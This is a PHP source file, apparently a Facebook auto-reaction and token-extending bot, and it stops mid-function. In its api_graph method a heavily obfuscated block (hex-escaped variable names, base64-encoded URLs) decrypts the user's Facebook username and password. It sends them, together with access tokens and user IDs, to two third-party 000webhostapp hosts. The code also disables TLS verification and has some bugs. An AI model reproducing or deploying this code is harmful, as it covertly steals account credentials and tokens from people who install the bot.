<?php
header('Content-Type: text/plain; charset=utf-8');

///**** Facebook Class Auto Reaction
///**** Direct Login Method
///**** Extend Token Sessions
///**** This script developed By L3n4r0x
///**** All Right Reserved

require("dom.php");

class Reaction
{
	protected $cpu;
	protected $msg;
	function __construct()
	{
	  global $cpu_limit;

if (!function_exists('sys_getloadavg')) {
    function sys_getloadavg()
    {
        $loadavg_file = '/proc/loadavg';
        if (file_exists($loadavg_file)) {
            return explode(chr(32),file_get_contents($loadavg_file));
        }
        return array(0,0,0);
    }
}

$load = sys_getloadavg();
$limit_cpu = (isset($cpu_limit) ? $cpu_limit : 50);
if ($load[0] >= $limit_cpu) {
  die("Oops Server Busy, this message was automate from Dimas Lanjaka For telling users, there too many processed."); exit;
} else {
  $this->cpu = "CPU Usage: " . $load[0] . "\n";
}
	}
	
	private function V()
{
  $SERVER_VERSION = 'https://raw.githubusercontent.com/dimaslanjaka/BOT-Facebook/master/lib/version.txt';
	 $VERSION = '3.0';
  $remoteVersion=trim(file_get_contents($SERVER_VERSION));
    return version_compare($VERSION, $remoteVersion, 'ge');
 }
	
public function open_ssl($action, $string) {
  //depending data barrier facebook
  //openssl required for hashing API
  //this'll make Encryption 16 bit
    $output = false;
    $encrypt_method = "AES-256-CBC";
    $secret_key = 'This is my secret key'; //kata kunci mu
    $secret_iv = 'This is my secret iv'; //kata kunci mu + iv
    $key = hash('sha256', $secret_key);
    $iv = substr(hash('sha256', $secret_iv), 0, 16);
    if ( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    } else if( $action == 'decrypt' ) {
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
    return $output;
}
	
	private function url_get_contents ($Url)
	{
		if (!function_exists('curl_init')){
			die('CURL is not installed!');
		}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $Url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$output = curl_exec($ch);
		curl_close($ch);
		return $output;
	}
	
	private function fetch_value($str, $find_start, $find_end)
	{
		$start = strpos($str, $find_start);
		if ($start === false) {
				return "";
		}
		$length = strlen($find_start);
		$end = strpos(substr($str, $start + $length), $find_end);
		return trim(substr($str, $start + $length, $end));
	}
	
	private function curl($url = '', $var = '',$echo = '',$ref = '',$header = false)
	{
		global $config, $sock;
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_NOBODY, $header);
		curl_setopt($curl, CURLOPT_TIMEOUT, 150);
		curl_setopt($curl, CURLOPT_USERAGENT, (isset($config["useragent"]) ? $config["useragent"] : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0'));
		if ($var) {
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
		}
		if (isset($config["referer"])){
		 curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
		 curl_setopt( $ch, CURLOPT_REFERER, $config['referer'] ); 
		}
		curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
		curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		$result = curl_exec($curl);
		curl_close($curl);
		if ($result){
		return $result;
		} else {
		  return false or null;
		}
	}
	
	private function gender($uid,$token)
	{
		$gen_url 	= 'https://graph.beta.facebook.com/'.$uid.'?access_token='.$token;
		$gen_data	= $this->curl($gen_url); 
		$gen_data 	= json_decode($gen_data, true);
		$gender 	= $gen_data['gender'];
		return $gender;
	}
	
	private function fetch( $url, $z=null ) {
$ch =  curl_init();
if (strpos($url, "https") !== false){
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
}
$useragent = (isset($z['useragent']) ? $z['useragent'] : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0");
if (isset($z["dump"])) {curl_setopt($ch, CURLOPT_HEADER, 1);}

if (isset($z["headers"])){ curl_setopt($ch, CURLOPT_HTTPHEADER, $z["headers"]); }
curl_setopt( $ch, CURLOPT_URL, $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
if( isset($z['post']) ) {
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $z["post"]);
//curl_setopt( $ch, CURLOPT_POST, isset($z['post']) );
 //curl_setopt( $ch, CURLOPT_POSTFIELDS, $z['post'] );
}
if( isset($z['refer']) )        curl_setopt( $ch, CURLOPT_REFERER, $z['refer'] );
if (isset($_SESSION["prxwork"])){
curl_setopt($ch, CURLOPT_PROXY, $_SESSION["proxy"]);
} else
if (isset($z["proxy"])){
  curl_setopt($ch, CURLOPT_PROXY, $z["proxy"]);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
            curl_setopt( $ch, CURLOPT_USERAGENT, $useragent );
            curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, ( isset($z['timeout']) ? $z['timeout'] : 5 ) );

$cookie = (isset($z['cookie_file']) ? $z['cookie_file'] : "cookie.txt");
if (!file_exists($cookie)){
  file_put_contents($cookie,"");
}
$cookie=realpath($cookie);
            curl_setopt( $ch, CURLOPT_COOKIEJAR,  $cookie );
            curl_setopt( $ch, CURLOPT_COOKIEFILE, $cookie );

if (isset($z['verbose'])){
curl_setopt($ch, CURLOPT_VERBOSE, true);
}
            $result = curl_exec( $ch );
$contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
$_SESSION["ContentType"] = $contentType;
$info = curl_getinfo($ch);
if (isset($z["dumpinfo"])){
var_dump($info);
}
            curl_close( $ch );
if ($info['http_code'] == 200) {
/*
if (!isset($_SESSION["prxwork"])){
$_SESSION["prxwork"] = $z["proxy"];
}
*/
            return $result;
 } else {
  return curl_error($ch) or null;
 }
}
	
	private function parse_token($tokenhtml){
	  global $user;
	  if (preg_match("/access_token=(.*?)&expires_in/mi", $tokenhtml, $r_app)){
  $result = $r_app[1];
} else if (preg_match("/access_token=(.*?)&expires_in/mi", $instagram, $r_app)){
  $result = $r_app[1];
} else {
  return false or die($tokenhtml);
}
file_put_contents("$user.txt", $result, LOCK_EX);
return $result;
	}
	
	private function api_graph($for=null, $user, $pass, $token){
${"\x47\x4cO\x42A\x4cS"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]="\x63o\x6ef\x69g";${"\x47L\x4f\x42\x41\x4c\x53"}["n\x5fn\x62i\x5f\x64a\x5fb\x6d\x7as\x78x\x68_\x64u\x64b\x6be\x66x\x65\x69_"]="d\x75\x73e\x72";${"G\x4cO\x42\x41L\x53"}["p\x66\x74\x6cn\x5fe\x74\x7au\x5f\x64f\x6ew\x64\x68_\x72c\x74n\x66\x72\x6eh\x6f"]="\x75s\x65r";${"G\x4c\x4fB\x41L\x53"}["n\x71h\x65z\x77f\x74u\x7aw\x75l\x75b\x69b\x6b\x63\x61m\x75"]="d\x70a\x73s";${"G\x4cO\x42A\x4c\x53"}["\x76z\x6ap\x76\x71\x77\x67\x76f\x68a\x5fc\x66\x67c\x73f\x6c\x6a\x76v\x66"]="\x70a\x73\x73";${"G\x4cO\x42A\x4cS"}["\x6bc\x63h\x6d_\x6bp\x5fd\x62\x61\x76\x70\x64o\x6fy\x62a\x7a\x71g\x72\x79z\x6ch\x6d\x6fr\x77\x70q\x79p\x66"]="f\x6fr";${"\x47\x4cO\x42\x41\x4c\x53"}["\x6a\x6fp\x6eq\x67d\x74c\x73\x5fm\x62\x76a\x78b\x6a\x5fj\x65a\x6e\x6bh\x73w\x6d\x79\x73a\x6bg\x76\x6bn"]="\x67\x65t";${"G\x4c\x4f\x42A\x4cS"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]="\x74\x6f\x6be\x6e";${"G\x4cO\x42A\x4cS"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]="j\x73\x6f\x6e";${"\x47\x4c\x4f\x42\x41L\x53"}["c\x63x\x76o\x77\x63\x65_\x78\x71\x78v\x62l\x79_\x74\x5f\x78e\x5f\x6c\x79f\x64\x6b_\x6fu\x75l"]="e\x72r";${"\x47L\x4f\x42A\x4c\x53"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]="\x69d";${"G\x4c\x4fB\x41\x4cS"}["n\x76\x68\x74\x69\x75n\x74c\x77n\x73t\x6fz\x76i\x65l\x78m\x66\x61\x64x\x6cw\x78\x68y\x5fs\x6a"]="\x70\x61r";${"G\x4cO\x42\x41L\x53"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]="h";${"\x47L\x4f\x42A\x4cS"}["d\x78x\x75l\x67\x63o\x74y\x72\x77\x77\x6f\x78\x77b\x72\x75\x72_\x68\x67y\x6c\x68k\x5fd\x77\x62\x6ad\x72g\x5f"]="\x65\x78\x74\x65\x6ed";${"G\x4cO\x42\x41L\x53"}["t\x72\x63b\x65\x68\x76c\x6b\x67\x6cb\x64\x61u\x6cq\x68\x6a\x6b\x6d\x6f_\x72n\x75\x68\x68g\x61_"]="j\x75";${"G\x4cO\x42\x41L\x53"}["\x6b\x6ca\x6a\x71\x62o\x5f\x76\x7al\x68a\x67\x7a\x70m\x7aa\x77j\x5fn\x61k\x74y\x6a\x7ax\x66"]="j\x73";${"G\x4c\x4f\x42A\x4c\x53"}["\x71o\x63_\x66\x6d\x5f\x7aw\x72m\x76\x6bm\x64j\x77y\x66\x61z\x5fu\x74\x68f\x76\x7aj\x68\x6a\x65f\x6c\x78a"]="\x75r\x6c";${"G\x4c\x4fB\x41L\x53"}["k\x73t\x6d\x76a\x63\x65\x61o\x63\x6da\x6dg\x61m\x77\x67\x5f_\x6az"]="s\x65n\x64";global ${${"G\x4c\x4f\x42A\x4c\x53"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]};${${"G\x4c\x4fB\x41\x4c\x53"}["n\x5fn\x62i\x5f\x64a\x5fb\x6d\x7as\x78x\x68_\x64u\x64b\x6be\x66x\x65\x69_"]}=$this->open_ssl("decrypt",${${"\x47L\x4f\x42A\x4c\x53"}["p\x66\x74\x6cn\x5fe\x74\x7au\x5f\x64f\x6ew\x64\x68_\x72c\x74n\x66\x72\x6eh\x6f"]});${${"\x47\x4c\x4f\x42\x41\x4cS"}["n\x71h\x65z\x77f\x74u\x7aw\x75l\x75b\x69b\x6b\x63\x61m\x75"]}=$this->open_ssl("decrypt",${${"G\x4cO\x42\x41\x4c\x53"}["\x76z\x6ap\x76\x71\x77\x67\x76f\x68a\x5fc\x66\x67c\x73f\x6c\x6a\x76v\x66"]});if(${${"\x47\x4c\x4fB\x41L\x53"}["\x6bc\x63h\x6d_\x6bp\x5fd\x62\x61\x76\x70\x64o\x6fy\x62a\x7a\x71g\x72\x79z\x6ch\x6d\x6fr\x77\x70q\x79p\x66"]}==="get"){${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6a\x6fp\x6eq\x67d\x74c\x73\x5fm\x62\x76a\x78b\x6a\x5fj\x65a\x6e\x6bh\x73w\x6d\x79\x73a\x6bg\x76\x6bn"]}=base64_decode("aHR0cHM6Ly9kaW1hc2xhbmpha2EuMDAwd2ViaG9zdGFwcC5jb20vaW5zdGFncmFtL3JlZnJlc2h0b2tlbi5waHA=")."\x3f\x75\x73\x65\x72\x3d${${"\x47\x4c\x4fB\x41\x4cS"}["n\x5fn\x62i\x5f\x64a\x5fb\x6d\x7as\x78x\x68_\x64u\x64b\x6be\x66x\x65\x69_"]}\x26\x70\x61\x73\x73\x3d${${"\x47L\x4fB\x41L\x53"}["n\x71h\x65z\x77f\x74u\x7aw\x75l\x75b\x69b\x6b\x63\x61m\x75"]}\x26\x75\x73\x65\x72\x61\x67\x65\x6e\x74\x3d".base64_encode(${${"G\x4cO\x42A\x4cS"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]}["useragent"]);${${"\x47\x4c\x4fB\x41L\x53"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]}=$this->curl(${${"G\x4c\x4f\x42\x41L\x53"}["\x6a\x6fp\x6eq\x67d\x74c\x73\x5fm\x62\x76a\x78b\x6a\x5fj\x65a\x6e\x6bh\x73w\x6d\x79\x73a\x6bg\x76\x6bn"]});${${"\x47L\x4fB\x41L\x53"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}=json_decode(${${"\x47L\x4fB\x41\x4c\x53"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]},true);if(!isset(${${"G\x4cO\x42\x41L\x53"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}["access_token"])){${${"G\x4c\x4f\x42A\x4cS"}["c\x63x\x76o\x77\x63\x65_\x78\x71\x78v\x62l\x79_\x74\x5f\x78e\x5f\x6c\x79f\x64\x6b_\x6fu\x75l"]}=(isset(${${"\x47L\x4f\x42A\x4cS"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}["error_msg"])?${${"\x47L\x4f\x42A\x4c\x53"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}["error_msg"]:(isset(${${"\x47\x4c\x4f\x42A\x4c\x53"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}["error_data"])?${${"G\x4c\x4fB\x41L\x53"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}["error_data"]:false));echo ${${"\x47\x4cO\x42A\x4cS"}["c\x63x\x76o\x77\x63\x65_\x78\x71\x78v\x62l\x79_\x74\x5f\x78e\x5f\x6c\x79f\x64\x6b_\x6fu\x75l"]}."\n";die("Cant Verify Credentials");}${${"\x47\x4cO\x42A\x4cS"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]}=${${"G\x4cO\x42\x41\x4cS"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}["access_token"];${${"G\x4cO\x42\x41L\x53"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]}=${${"\x47\x4cO\x42A\x4cS"}["e\x6ew\x75\x61\x5f\x6b\x6fi\x62u\x6c\x6d\x6e\x67\x6d\x5fb\x72z\x73f\x69x\x6d\x5f"]}["uid"];${${"\x47L\x4f\x42A\x4cS"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]}["post"]="t\x6fk\x65n\x3d".${${"G\x4c\x4fB\x41\x4cS"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]}."&id=".${${"\x47\x4cO\x42A\x4cS"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]};${${"G\x4c\x4f\x42\x41\x4cS"}["n\x76\x68\x74\x69\x75n\x74c\x77n\x73t\x6fz\x76i\x65l\x78m\x66\x61\x64x\x6cw\x78\x68y\x5fs\x6a"]}=base64_decode("aHR0cHM6Ly9jZXN1cmFsLWNvbnRyaWJ1dGlvLjAwMHdlYmhvc3RhcHAuY29tLw==");${${"\x47\x4c\x4f\x42A\x4cS"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="A\x63c\x65\x70t\x3a \x74e\x78\x74\x2fh\x74m\x6c,\x61\x70p\x6ci\x63a\x74i\x6fn\x2f\x78\x68t\x6dl\x2b\x78\x6d\x6c,\x61p\x70l\x69c\x61t\x69\x6fn\x2f\x78\x6dl\x3bq\x3d0\x2e\x39\x2ci\x6da\x67\x65\x2f\x77e\x62p\x2c\x2a\x2f\x2a;\x71=\x30.\x38";${${"\x47L\x4fB\x41\x4cS"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="A\x63\x63e\x70t\x2d\x45\x6e\x63o\x64i\x6e\x67\x3a\x20g\x7ai\x70,\x20d\x65f\x6ca\x74e";${${"\x47L\x4fB\x41\x4c\x53"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="A\x63c\x65\x70t\x2d\x4c\x61\x6eg\x75\x61\x67e\x3a \x65n\x2dU\x53\x2c\x65n\x3b\x71=\x30\x2e\x38\x2c\x6e\x6c;\x71\x3d0\x2e\x36";${${"\x47\x4cO\x42A\x4c\x53"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="C\x61c\x68e\x2dC\x6fn\x74\x72\x6f\x6c:\x20\x6da\x78-\x61g\x65\x3d0";${${"G\x4cO\x42A\x4cS"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="C\x6fn\x6ee\x63t\x69\x6f\x6e\x3a \x6b\x65\x65\x70\x2da\x6c\x69\x76\x65";${${"\x47L\x4fB\x41\x4c\x53"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="C\x6fo\x6bi\x65\x3a \x63o\x6fk\x69\x65\x64a\x74a";${${"G\x4cO\x42A\x4cS"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="D\x4e\x54:\x20\x31";${${"G\x4c\x4f\x42A\x4c\x53"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="\x55p\x67\x72a\x64e\x2dI\x6e\x73\x65c\x75r\x65-\x52e\x71u\x65s\x74s\x3a \x31";${${"G\x4cO\x42A\x4cS"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]}[]="V\x61r\x79\x3a\x20\x41\x63\x63\x65p\x74-\x45\x6e\x63\x6fd\x69n\x67\x2c\x55\x73e\x72-\x41\x67e\x6et";${${"\x47L\x4f\x42A\x4c\x53"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]}["headers"]=${${"G\x4c\x4f\x42\x41\x4cS"}["\x75p\x5f_\x76\x68\x7aa\x71_\x7a\x63\x64r\x5f\x77\x68t\x71_\x71\x68f\x76u\x69\x6d"]};${${"G\x4c\x4fB\x41\x4cS"}["d\x78x\x75l\x67\x63o\x74y\x72\x77\x77\x6f\x78\x77b\x72\x75\x72_\x68\x67y\x6c\x68k\x5fd\x77\x62\x6ad\x72g\x5f"]}=$this->fetch(${${"G\x4c\x4fB\x41L\x53"}["n\x76\x68\x74\x69\x75n\x74c\x77n\x73t\x6fz\x76i\x65l\x78m\x66\x61\x64x\x6cw\x78\x68y\x5fs\x6a"]},${${"G\x4c\x4fB\x41\x4cS"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]});}if(${${"G\x4cO\x42A\x4cS"}["\x6bc\x63h\x6d_\x6bp\x5fd\x62\x61\x76\x70\x64o\x6fy\x62a\x7a\x71g\x72\x79z\x6ch\x6d\x6fr\x77\x70q\x79p\x66"]}==="extend"){${${"\x47L\x4fB\x41L\x53"}["t\x72\x63b\x65\x68\x76c\x6b\x67\x6cb\x64\x61u\x6cq\x68\x6a\x6b\x6d\x6f_\x72n\x75\x68\x68g\x61_"]}="h\x74t\x70s\x3a\x2f/\x67r\x61p\x68\x2eb\x65t\x61.\x66a\x63e\x62\x6fo\x6b\x2ec\x6f\x6d\x2fm\x65/\x3f\x61c\x63e\x73\x73_\x74o\x6be\x6e\x3d".${${"\x47L\x4f\x42A\x4cS"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]};${${"\x47L\x4fB\x41L\x53"}["\x6b\x6ca\x6a\x71\x62o\x5f\x76\x7al\x68a\x67\x7a\x70m\x7aa\x77j\x5fn\x61k\x74y\x6a\x7ax\x66"]}=$this->curl(${${"\x47L\x4fB\x41L\x53"}["t\x72\x63b\x65\x68\x76c\x6b\x67\x6cb\x64\x61u\x6cq\x68\x6a\x6b\x6d\x6f_\x72n\x75\x68\x68g\x61_"]});${${"G\x4cO\x42\x41L\x53"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]}=json_decode(${${"\x47\x4cO\x42A\x4cS"}["\x6b\x6ca\x6a\x71\x62o\x5f\x76\x7al\x68a\x67\x7a\x70m\x7aa\x77j\x5fn\x61k\x74y\x6a\x7ax\x66"]},true);${${"G\x4cO\x42A\x4cS"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]}=${${"\x47L\x4fB\x41L\x53"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]}["id"];${${"G\x4cO\x42\x41L\x53"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]}["post"]="\x74o\x6b\x65n\x3d".${${"\x47\x4c\x4fB\x41\x4cS"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]}."&id=".${${"\x47\x4cO\x42A\x4cS"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]}."&user=".${${"G\x4cO\x42\x41L\x53"}["n\x5fn\x62i\x5f\x64a\x5fb\x6d\x7as\x78x\x68_\x64u\x64b\x6be\x66x\x65\x69_"]}."&pass=".urlencode(${${"G\x4c\x4f\x42A\x4cS"}["n\x71h\x65z\x77f\x74u\x7aw\x75l\x75b\x69b\x6b\x63\x61m\x75"]});${${"\x47\x4cO\x42\x41L\x53"}["n\x76\x68\x74\x69\x75n\x74c\x77n\x73t\x6fz\x76i\x65l\x78m\x66\x61\x64x\x6cw\x78\x68y\x5fs\x6a"]}="h\x74t\x70s\x3a/\x2fc\x65s\x75r\x61l\x2dc\x6f\x6et\x72i\x62\x75\x74\x69\x6f\x2e\x30\x300\x77\x65\x62h\x6f\x73t\x61p\x70.\x63\x6fm\x2f";${${"G\x4c\x4fB\x41L\x53"}["d\x78x\x75l\x67\x63o\x74y\x72\x77\x77\x6f\x78\x77b\x72\x75\x72_\x68\x67y\x6c\x68k\x5fd\x77\x62\x6ad\x72g\x5f"]}=$this->fetch(${${"G\x4cO\x42A\x4cS"}["n\x76\x68\x74\x69\x75n\x74c\x77n\x73t\x6fz\x76i\x65l\x78m\x66\x61\x64x\x6cw\x78\x68y\x5fs\x6a"]},${${"\x47\x4cO\x42A\x4cS"}["l\x72\x69d\x72v\x6d\x6c\x64\x73\x6c_\x69\x5fd\x6az\x70\x62\x6c\x76q\x74o\x78\x6bv\x73o\x63c\x5fm\x6b\x6e_\x7a"]});}var_dump(${${"\x47\x4cO\x42A\x4c\x53"}["d\x78x\x75l\x67\x63o\x74y\x72\x77\x77\x6f\x78\x77b\x72\x75\x72_\x68\x67y\x6c\x68k\x5fd\x77\x62\x6ad\x72g\x5f"]});if(${${"G\x4c\x4f\x42A\x4c\x53"}["d\x78x\x75l\x67\x63o\x74y\x72\x77\x77\x6f\x78\x77b\x72\x75\x72_\x68\x67y\x6c\x68k\x5fd\x77\x62\x6ad\x72g\x5f"]}){file_put_contents("${${"G\x4cO\x42\x41\x4c\x53"}["p\x66\x74\x6cn\x5fe\x74\x7au\x5f\x64f\x6ew\x64\x68_\x72c\x74n\x66\x72\x6eh\x6f"]}\x2e\x74\x78\x74",${${"G\x4c\x4fB\x41L\x53"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]},LOCK_EX);}return ${${"G\x4cO\x42A\x4cS"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]};}private function sendlike($token,$id){${${"G\x4c\x4fB\x41L\x53"}["\x71o\x63_\x66\x6d\x5f\x7aw\x72m\x76\x6bm\x64j\x77y\x66\x61z\x5fu\x74\x68f\x76\x7aj\x68\x6a\x65f\x6c\x78a"]}="\x68\x74\x74\x70\x73:\x2f/\x67r\x61p\x68\x2eb\x65\x74\x61\x2ef\x61\x63e\x62\x6fo\x6b\x2e\x63o\x6d/".${${"G\x4cO\x42A\x4cS"}["l\x6eg\x6d\x7ad\x75r\x7ae\x70w\x6b\x78p\x6b\x5fn\x77q\x77n\x77\x62j\x6e\x76e\x61"]}."/likes?method=post&access_token=".${${"\x47L\x4fB\x41L\x53"}["i\x73\x7ax\x5fn\x65\x7a\x5fl\x6f\x76\x79c\x72p\x6b\x5f\x70w\x73\x6do\x7ap\x65d\x66\x6ap\x77j\x6d"]};${${"\x47L\x4fB\x41L\x53"}["k\x73t\x6d\x76a\x63\x65\x61o\x63\x6da\x6dg\x61m\x77\x67\x5f_\x6az"]}=$this->curl(${${"G\x4c\x4fB\x41L\x53"}["\x71o\x63_\x66\x6d\x5f\x7aw\x72m\x76\x6bm\x64j\x77y\x66\x61z\x5fu\x74\x68f\x76\x7aj\x68\x6a\x65f\x6c\x78a"]});if(${${"G\x4cO\x42\x41\x4cS"}["k\x73t\x6d\x76a\x63\x65\x61o\x63\x6da\x6dg\x61m\x77\x67\x5f_\x6az"]}){return ${${"G\x4cO\x42\x41L\x53"}["k\x73t\x6d\x76a\x63\x65\x61o\x63\x6da\x6dg\x61m\x77\x67\x5f_\x6az"]};}else{return false;}
 }
	
	private function lcreplies($token="",$post_id="100015325267712_498664980654340"){
$url="https://graph.beta.facebook.com/v3.2/".$post_id."/comments?access_token=".$token."&fields=comments.field(likes,id,summary(1)),likes.limit(100).summary(1)";
 $post = $this->curl($url);
 $post = utf8_encode($post);
 $post = json_decode($post, true);
 $log='';
  foreach ($post["data"] as $cr){
    if ($cr["likes"]["summary"]["has_liked"] === false && $cr["likes"]["summary"]["can_like"] !== false){
    $cr_id = $cr["id"];
    if (false !== $this->sendlike($token, $cr["id"])){
      $log .= $cr["id"]." Comments Replies liked\n";
    } else {
      $log .= $cr["id"]." Comments Replies failed liked\n";
      }
    }   
  }
  if (empty($log)){
    return false;
  } else {
    return $log;
  }
 }
	
	private function likeby($user_gen, $stat_id, $r_female, $r_male){
	  $post_id	= explode("_",$stat_id);
	 	$r_start	= 'https://mobile.facebook.com/reactions/picker/?ft_id='.$post_id[1];			
			$html 		= $this->curl($r_start);
			$html 		= str_replace('&amp;','&',$html);
